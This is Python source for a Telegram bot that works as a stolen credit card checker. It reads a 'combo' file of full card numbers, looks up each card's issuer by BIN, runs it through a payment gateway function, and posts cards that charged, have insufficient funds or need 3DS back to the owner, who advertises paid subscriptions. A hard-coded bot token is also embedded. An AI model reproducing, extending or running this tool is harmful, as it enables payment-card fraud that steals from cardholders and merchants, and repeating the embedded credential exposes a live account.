import requests
import telebot, time
from telebot import types
from gatet import Tele
import os

token = '8489254912:AAGaD-U9Cms4aYyLQnpQah0AYU25PDzFe-g'
bot = telebot.TeleBot(token, parse_mode="HTML")

OWNER_ID = '1915369904'

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) != OWNER_ID:
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Rusisvirus")
        return
    bot.reply_to(message, "𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰❤️")

@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) != OWNER_ID:
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Rusisvirus")
        return
    
    dd = 0
    live = 0
    ch = 0
    ccn = 0
    cvv = 0
    lowfund = 0
    
    ko = bot.reply_to(message, "𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐍𝐨𝐰! ❤️").message_id
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    
    with open("combo.txt", "wb") as w:
        w.write(ee)
        
    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            
            for cc in lino:
                cc = cc.strip() # Remove extra spaces/newlines
                
                # ===== STOP CHECK =====
                if os.path.exists("stop.stop"):
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝑺𝑻𝑶𝑷 ✅\n𝑩𝒐𝒕 𝑩𝒚 ➜ @Rusisvirus')
                    os.remove('stop.stop')
                    return
                
                # ===== BIN LOOKUP (Safe Method) =====
                try:
                    data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                except:
                    data = {}
                
                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', '')
                bank = data.get('bank', 'Unknown')
                
                start_time = time.time()
                try:
                    last = str(Tele(cc))
                except Exception as e:
                    print(e)
                    last = 'missing payment form'
                
                end_time = time.time()
                execution_time = end_time - start_time
                
                # ===== DASHBOARD VIEW (OpenAI Style) =====
                view_text = f"""\
• <code>{cc}</code>

🟢 sᴛᴀᴛᴜs  ➜ <code>{last}</code>

💳 ᴄʜᴀʀɢᴇᴅ  ➜ <code>[ {ch} ]</code>

🔐 ᴄᴄɴ ➜ <code>[ {ccn} ]</code>

🔐 ᴄᴠᴠ ➜ <code>[ {cvv} ]</code>

⚠️ ʟᴏᴡ ғᴜɴᴅs ➜ <code>[ {lowfund} ]</code>

📊 ᴅᴇᴄʟɪɴᴇᴅ ➜ <code>[ {dd} ]</code>

• ᴛᴏᴛᴀʟ ➜ <code>[ {total} ]</code>
"""
                # Single Stop Button
                markup = types.InlineKeyboardMarkup(row_width=1)
                markup.add(types.InlineKeyboardButton("⛔ sᴛᴏᴘ ⚠️", callback_data="stop"))
                
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=view_text, reply_markup=markup)
                
                # ===== LOGIC & HIT SENDER (Original Style Restored) =====
                print(last)
                
                if 'Payment Successful' in last:
                    ch += 1
                    msg = f''' 
𝐂𝐀𝐑𝐃: <code>{cc}</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕!🥵</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                elif 'Your card does not support this type of purchase' in last:
                    cvv += 1
                                    
                elif 'security code is incorrect' in last or 'security code is invalid' in last:
                    ccn += 1
                    
                elif 'funds' in last:
                    lowfund += 1
                    msg = f'''			
𝐂𝐀𝐑𝐃: <code>{cc}</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝚏𝚞𝚗𝚍𝚜 😂</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                elif 'The payment needs additional action before completion!' in last:
                    cvv += 1
                    msg = f'''			
𝐂𝐀𝐑𝐃: <code>{cc}</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>𝟹𝙳𝚂 👍</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @Rusisvirus'''
                    bot.reply_to(message, msg)
                        
                else:
                    dd += 1
                    time.sleep(3) # Wait a bit on declined to avoid flood limits
                    
    except Exception as e:
        print(e)
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈 𝑫𝒐𝒏𝒆!\n𝑩𝒐𝒕 𝑩𝒚 ➜ @Rusisvirus')

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    with open("stop.stop", "w") as file:
        pass
    bot.answer_callback_query(call.id, "Stopping...")

# ===== SAFE POLLING =====
import telebot.apihelper as apihelper
apihelper.REQUEST_TIMEOUT = 30

while True:
    try:
        bot.polling(non_stop=True, timeout=20, long_polling_timeout=20)
    except Exception as e:
        print("Polling error:", e)
        time.sleep(5)
